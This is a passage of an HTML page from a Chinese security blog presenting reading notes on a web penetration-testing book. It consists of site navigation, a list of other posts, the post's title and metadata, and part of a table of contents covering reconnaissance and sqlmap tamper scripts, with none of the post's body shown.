@@ -1,0 +1,2405 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>《Web安全攻防-渗透测试实战指南》读书笔记 | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
+  <meta name="keywords" content=" 读书摘要 ">
+  <meta name="description" content="《Web安全攻防-渗透测试实战指南》读书笔记 | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:url" content="http://Bigbroke.com/404.html">
+<meta property="og:site_name" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-10-07T10:21:52.994Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta name="twitter:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+
+
+<link rel="icon" href="/img/head.jpg">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/hl_theme/sublime.css">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/default-skin/default-skin.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="true">
+</div>
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/head.jpg" />
+</a>
+<div class="author">
+    <span>Bigbroke</span>
+</div>
+
+<div class="icon">
+    
+    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
+    
+    
+    <a class="github" title="github" href="https://github.com/bigbroke" target="_blank"></a>
+    
+    
+    
+    
+    
+    <a class="instagram" title="instagram" href="https://www.instagram.com/1_be_winner/" target="_blank"></a>
+    
+    
+    
+    <a class="weibo" title="weibo" href="http://weibo.com/u/xxx/" target="_blank"></a>
+    
+    
+    <a class="email" title="email" href="mailto:72382781@qq.com"></a>
+    
+</div>
+
+
+
+<ul>
+    <li class="all active">全部文章</li>
+    
+    <li data-rel="思考"> 思考 </li>
+    
+    <li data-rel="Language"> Language </li>
+    
+    <li data-rel="CTF"> CTF </li>
+    
+    <li data-rel="AiSecurity"> AiSecurity </li>
+    
+    <li data-rel="代码审计"> 代码审计 </li>
+    
+    <li data-rel="Kali"> Kali </li>
+    
+    <li data-rel="工具"> 工具 </li>
+    
+    <li data-rel="WebSecurity"> WebSecurity </li>
+    
+    <li data-rel="读书摘要"> 读书摘要 </li>
+    
+    <li data-rel="渗透测试"> 渗透测试 </li>
+    
+    <li data-rel="内网"> 内网 </li>
+    
+    <li data-rel="源码阅读"> 源码阅读 </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="56">
+<input type="hidden" id="yelog_site_word_count" value="115.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/https/www.baidu.com">faBaidu</a></li>
+            
+            <li><a target="_blank" href="/https/www.google.com">fbGoogle</a></li>
+            
+            <li><a target="_blank" href="http://www.cnblogs.com/iamstudy/">I3m0n</a></li>
+            
+            <li><a target="_blank" href="http://ph0rse.me/">Ph0rse</a></li>
+            
+            <li><a target="_blank" href="http://03i0.com/">Sn00py</a></li>
+            
+            <li><a target="_blank" href="http://jlkl.github.io/">Str3am</a></li>
+            
+            <li><a target="_blank" href="http://marblue.me/">Marbule</a></li>
+            
+            <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
+            
+            <li><a target="_blank" href="http://zo1ro.tk/">ZO1RO</a></li>
+            
+            <li><a target="_blank" href="https://blog.ruozhi.xyz/">ru0zhI</a></li>
+            
+            <li><a target="_blank" href="http://wulidecade.cn/">Decade</a></li>
+            
+            <li><a target="_blank" href="https://www.cnblogs.com/sn1per/">Sn1per</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+        <label for="tagswitch">Tags:</label>
+        <input id="tagswitch" type="checkbox">
+    </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">思考</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">life</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">正则</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">WP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">first-blog</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">sqlilabs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">sqlmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">cve</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">VIM</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">密码学</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">hexo</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Nikto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">TCPDUMP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">QWASP_ZAP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">NETCAT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">Skipfish</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Vega</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件包含</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">读书摘要</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">信息收集</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Web漏洞</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">内网</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">渗透</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">黑客攻防web安全实战详解</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">入侵</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Dvwa</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="读书摘要 "
+           href="/archis/a7cdea15/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《互联网企业安全高级指南》读书笔记">《互联网企业安全高级指南》读书笔记</span>
+            <span class="post-date" title="2020-03-04 18:17:30">2020/03/04</span>
+        </a>
+        
+        <a  class="源码阅读 "
+           href="/archis/f4173bf8/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="Read-Sitadel-Source">Read-Sitadel-Source</span>
+            <span class="post-date" title="2019-03-15 00:00:08">2019/03/15</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/eed6fa1/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="AI-Security-Learning">AI-Security-Learning</span>
+            <span class="post-date" title="2019-02-17 21:15:30">2019/02/17</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/f7c9beed/"
+           data-tag="life"
+           data-author="" >
+            <span class="post-title" title="2018反思总结">2018反思总结</span>
+            <span class="post-date" title="2018-12-31 01:14:45">2018/12/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/49b464e6/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="初探线下CTF-AWD模式">初探线下CTF-AWD模式</span>
+            <span class="post-date" title="2018-12-02 17:13:50">2018/12/02</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/7db24e65/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="内网渗透基础知识">内网渗透基础知识</span>
+            <span class="post-date" title="2018-12-02 17:07:15">2018/12/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/6bd5dfde/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="第一届安洵杯writeup">第一届安洵杯writeup</span>
+            <span class="post-date" title="2018-11-26 21:23:57">2018/11/26</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4341f801/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="HCTF2018-web writeup">HCTF2018-web writeup</span>
+            <span class="post-date" title="2018-11-13 13:26:20">2018/11/13</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/47a94ec3/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="docker复现ctf&amp;dockerfile编写ctf环境">docker复现ctf&amp;dockerfile编写ctf环境</span>
+            <span class="post-date" title="2018-10-29 21:57:39">2018/10/29</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/441c37c9/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院审计类通关指南">墨者学院审计类通关指南</span>
+            <span class="post-date" title="2018-10-28 22:02:08">2018/10/28</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/767136e1/"
+           data-tag="复现"
+           data-author="" >
+            <span class="post-title" title="phpMyAdmin 4.8.x 本地文件包含">phpMyAdmin 4.8.x 本地文件包含</span>
+            <span class="post-date" title="2018-10-27 12:19:37">2018/10/27</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/924987ad/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《Web安全攻防-渗透测试实战指南》读书笔记">《Web安全攻防-渗透测试实战指南》读书笔记</span>
+            <span class="post-date" title="2018-10-26 22:05:27">2018/10/26</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/b46a6d47/"
+           data-tag="web"
+           data-author="" >
+            <span class="post-title" title="验证码相关安全问题">验证码相关安全问题</span>
+            <span class="post-date" title="2018-10-23 23:05:15">2018/10/23</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/a5c61176/"
+           data-tag="cve"
+           data-author="" >
+            <span class="post-title" title="Xss in MetInfo V6.1.2">Xss in MetInfo V6.1.2</span>
+            <span class="post-date" title="2018-10-16 02:16:08">2018/10/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/173905c2/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="护网杯wp">护网杯wp</span>
+            <span class="post-date" title="2018-10-13 23:53:02">2018/10/13</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/95d370e7/"
+           data-tag="Web漏洞"
+           data-author="" >
+            <span class="post-title" title="web漏洞挖掘之点击劫持漏洞">web漏洞挖掘之点击劫持漏洞</span>
+            <span class="post-date" title="2018-10-11 14:13:02">2018/10/11</span>
+        </a>
+        
+        <a  class="Language "
+           href="/archis/7fe4b50e/"
+           data-tag="正则"
+           data-author="" >
+            <span class="post-title" title="20个常用的正则表达式">20个常用的正则表达式</span>
+            <span class="post-date" title="2018-10-09 16:29:34">2018/10/09</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/d4eed376/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="机器学习概念">机器学习概念</span>
+            <span class="post-date" title="2018-10-09 16:29:01">2018/10/09</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/17ef10d7/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="浅谈内网渗透流程">浅谈内网渗透流程</span>
+            <span class="post-date" title="2018-10-09 10:50:44">2018/10/09</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18042369/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒5月">安恒5月</span>
+            <span class="post-date" title="2018-08-25 20:40:51">2018/08/25</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/b20debe2/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒7月">安恒7月</span>
+            <span class="post-date" title="2018-08-25 20:39:36">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/8395d5c7/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院php代码审计1">墨者学院php代码审计1</span>
+            <span class="post-date" title="2018-08-25 20:32:48">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/d8be4236/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="PHP字符串&#39;和“区别">PHP字符串&#39;和“区别</span>
+            <span class="post-date" title="2018-08-25 20:22:01">2018/08/25</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/35d3b1d4/"
+           data-tag="渗透"
+           data-author="" >
+            <span class="post-title" title="渗透测试基础">渗透测试基础</span>
+            <span class="post-date" title="2018-08-01 23:43:32">2018/08/01</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/80e1beed/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="八月展望">八月展望</span>
+            <span class="post-date" title="2018-08-01 23:41:26">2018/08/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/f4e3f3ec/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="2018SCTF-wp">2018SCTF-wp</span>
+            <span class="post-date" title="2018-06-20 22:40:40">2018/06/20</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/2947d8f2/"
+           data-tag="密码学"
+           data-author="" >
+            <span class="post-title" title="cbc字节翻转攻击">cbc字节翻转攻击</span>
+            <span class="post-date" title="2018-06-01 00:47:50">2018/06/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4e1d9865/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="ISCC2018-writeup">ISCC2018-writeup</span>
+            <span class="post-date" title="2018-05-28 00:54:05">2018/05/28</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ceb4048b/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="全国网络空间安全技术大赛2018三道wp">全国网络空间安全技术大赛2018三道wp</span>
+            <span class="post-date" title="2018-05-15 19:04:17">2018/05/15</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/e36e397d/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="bugku-misc">bugku-misc</span>
+            <span class="post-date" title="2018-05-01 19:02:14">2018/05/01</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/40a439a4/"
+           data-tag="Nmap"
+           data-author="" >
+            <span class="post-title" title="Nmap 使用技巧汇总">Nmap 使用技巧汇总</span>
+            <span class="post-date" title="2018-04-23 22:07:46">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/844a29d4/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="php文件包含漏洞">php文件包含漏洞</span>
+            <span class="post-date" title="2018-04-23 21:39:49">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/ea42f6a6/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传总结">文件上传总结</span>
+            <span class="post-date" title="2018-04-23 21:39:03">2018/04/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/a7a61e20/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="DDCTF三道小结">DDCTF三道小结</span>
+            <span class="post-date" title="2018-04-23 21:35:39">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/1f382107/"
+           data-tag="入侵"
+           data-author="" >
+            <span class="post-title" title="高级入侵">高级入侵</span>
+            <span class="post-date" title="2018-04-23 21:33:14">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/312e3d12/"
+           data-tag="信息收集"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2018-04-02 16:15:51">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ced895c1/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs less11-15">sqli-labs less11-15</span>
+            <span class="post-date" title="2018-04-02 16:15:38">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/9a0d7777/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs  less7-10">sqli-labs  less7-10</span>
+            <span class="post-date" title="2018-04-02 16:15:23">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4303333d/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs5-6(盲注)">sqli-labs5-6(盲注)</span>
+            <span class="post-date" title="2018-04-02 16:14:58">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/239c6225/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="Sqli-labs  1-4">Sqli-labs  1-4</span>
+            <span class="post-date" title="2018-04-02 16:13:07">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/79216fa/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="实验吧web—writeup">实验吧web—writeup</span>
+            <span class="post-date" title="2018-04-02 16:10:18">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/2ccf6cb2/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第二届强网杯-部分wp">第二届强网杯-部分wp</span>
+            <span class="post-date" title="2018-04-02 16:08:51">2018/04/02</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/2ab3b8ea/"
+           data-tag="黑客攻防web安全实战详解"
+           data-author="" >
+            <span class="post-title" title="黑客攻防web安全实战详解">黑客攻防web安全实战详解</span>
+            <span class="post-date" title="2018-02-27 19:57:12">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/b248361f/"
+           data-tag="QWASP_ZAP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP">kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</span>
+            <span class="post-date" title="2018-02-27 19:54:20">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/136af25a/"
+           data-tag="Vega"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Vega">kali渗透测试之Web渗透-扫描工具-Vega</span>
+            <span class="post-date" title="2018-02-27 19:51:36">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/497d64c3/"
+           data-tag="Skipfish"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Skipfish">kali渗透测试之Web渗透-扫描工具-Skipfish</span>
+            <span class="post-date" title="2018-02-27 19:49:37">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/a04b3dd7/"
+           data-tag="Nikto"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Nikto">kali渗透测试之Web渗透-扫描工具-Nikto</span>
+            <span class="post-date" title="2018-02-27 19:47:03">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/2b646ba1/"
+           data-tag="TCPDUMP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-TCPDUMP">kali渗透测试之Web渗透-工具-TCPDUMP</span>
+            <span class="post-date" title="2018-02-27 19:42:43">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/32be69d6/"
+           data-tag="NETCAT"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-NETCAT">kali渗透测试之Web渗透-工具-NETCAT</span>
+            <span class="post-date" title="2018-02-27 19:38:09">2018/02/27</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/2e6b5387/"
+           data-tag="VIM"
+           data-author="" >
+            <span class="post-title" title="Vim简单入门笔记">Vim简单入门笔记</span>
+            <span class="post-date" title="2017-12-15 19:07:45">2017/12/15</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/fb4597d6/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="17-11反思与进取">17-11反思与进取</span>
+            <span class="post-date" title="2017-11-22 17:10:55">2017/11/22</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18acffef/"
+           data-tag="Dvwa"
+           data-author="" >
+            <span class="post-title" title="DVWA笔记">DVWA笔记</span>
+            <span class="post-date" title="2017-11-22 17:06:26">2017/11/22</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/undefined/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo博客搭建">hexo博客搭建</span>
+            <span class="post-date" title="2017-11-22 16:57:45">2017/11/22</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/18bbc00d/"
+           data-tag="sqlmap"
+           data-author="" >
+            <span class="post-title" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解">SQLMAP注入教程-11种常见SQLMAP使用方法详解</span>
+            <span class="post-date" title="2017-11-21 04:27:10">2017/11/21</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/83955867/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第八届Geek部分web">第八届Geek部分web</span>
+            <span class="post-date" title="2017-10-20 16:07:05">2017/10/20</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/e53fb0b9/"
+           data-tag="first-blog"
+           data-author="" >
+            <span class="post-title" title="my-first-blog">my-first-blog</span>
+            <span class="post-date" title="2017-09-27 16:56:58">2017/09/27</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-《Web安全攻防-渗透测试实战指南》读书笔记" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">《Web安全攻防-渗透测试实战指南》读书笔记</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+            <a href="javascript:" data-rel="读书摘要">读书摘要</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">读书摘要</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:15'>2018-10-26 22:05</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:11,413</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第1章-渗透测试之信息收集"><span class="toc-text">第1章 渗透测试之信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#域名信息"><span class="toc-text">域名信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#敏感信息"><span class="toc-text">敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#子域名"><span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指纹识别"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找真实ip"><span class="toc-text">查找真实ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#收集敏感目录"><span class="toc-text">收集敏感目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第2章-搭建漏洞环境及实战"><span class="toc-text">第2章 搭建漏洞环境及实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第3章-常用工具"><span class="toc-text">第3章 常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法："><span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#各个-tamper-的作用"><span class="toc-text">各个 tamper 的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#apostrophemask-py"><span class="toc-text">apostrophemask.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apostrophenullencode-py"><span class="toc-text">apostrophenullencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#appendnullbyte-py"><span class="toc-text">appendnullbyte.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64encode-py"><span class="toc-text">base64encode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#between-py"><span class="toc-text">between.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bluecoat-py"><span class="toc-text">bluecoat.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chardoubleencode-py"><span class="toc-text">chardoubleencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charencode-py"><span class="toc-text">charencode.py:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charunicodeencode-py："><span class="toc-text">charunicodeencode.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commalesslimit-py："><span class="toc-text">commalesslimit.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commalessmid-py："><span 